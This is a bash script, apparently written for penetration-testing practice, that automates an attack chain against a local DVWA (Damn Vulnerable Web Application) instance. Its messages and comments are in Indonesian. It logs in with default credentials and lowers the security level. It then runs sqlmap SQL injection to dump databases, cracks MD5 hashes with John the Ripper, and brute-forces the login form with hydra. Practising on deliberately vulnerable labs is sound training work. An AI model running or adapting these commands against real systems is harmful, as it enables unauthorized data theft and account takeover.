#!/bin/bash

TARGET="http://127.0.0.1:8000"
LOGIN_URL="$TARGET/login.php"
COOKIE_JAR=$(mktemp)

echo "[*] Melakukan login otomatis ke DVWA..."
curl -s -c "$COOKIE_JAR" "$LOGIN_URL" > /dev/null
curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
     --data "username=admin&password=password&Login=Login" \
     "$LOGIN_URL" > /dev/null

PHPSESSID=$(grep "PHPSESSID" "$COOKIE_JAR" | awk '{print $NF}')
rm -f "$COOKIE_JAR"

if [ -z "$PHPSESSID" ]; then
    echo "[-] Gagal mendapatkan PHPSESSID."
    exit 1
fi

echo "[+] Berhasil! Mendapatkan PHPSESSID: $PHPSESSID"
SECURITY_COOKIE="security=low; PHPSESSID=$PHPSESSID"

echo "[*] Mengatur level security DVWA ke 'low'..."
curl -s -b "$SECURITY_COOKIE" "$TARGET/security.php?security=low&seclevel_submit=Submit" > /dev/null
echo "[OK]"

echo ""
echo "[1] dumping..."
# Menggunakan --dbs dulu untuk memastikan koneksi dan cookie diterima tanpa redirect
sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$SECURITY_COOKIE" \
       --dbms=MySQL \
       --batch \
       --dbs

echo ""
echo "[2] cracking..."
rm -f ~/.john/john.pot 2>/dev/null
john hash.txt --wordlist=cracked.txt --format=Raw-MD5

echo ""
echo "[3] brute..."
# Perbaikan sintaks modul hydra untuk form-post standar
hydra -l admin -P cracked.txt 127.0.0.1 -s 8000 http-form-post "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -H "Cookie: $SECURITY_COOKIE"
